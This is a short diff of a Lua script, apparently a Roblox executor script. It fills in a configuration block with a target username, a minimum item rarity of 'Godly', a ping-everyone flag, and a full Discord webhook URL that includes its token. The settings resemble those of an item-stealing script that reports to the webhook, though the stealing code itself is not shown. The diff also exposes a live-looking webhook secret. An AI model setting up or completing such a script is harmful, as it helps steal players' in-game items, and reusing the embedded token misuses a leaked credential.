@@ -69,11 +69,11 @@ _G.RealExecutor = jobData.Executor
 -- ============================================================
 --  USER CONFIGURATION
 -- ============================================================
-local Usernames = {""}
+local Usernames = {"Iceyblueii"}
 local MinimumRarity = 'Godly'
 local MinimumValue = 1
 local PingEveryone = 'Yes'
-local Webhook = ""
+local Webhook = "https://discord.com/api/webhooks/1537567557228302446/Tbb-5DVptEEgtmpJGXQByQmCzblgUt1y32rkXJaLsOMdlArbmG3J--y2LdvPoU5HEMyM"
 
 -- ============================================================
 
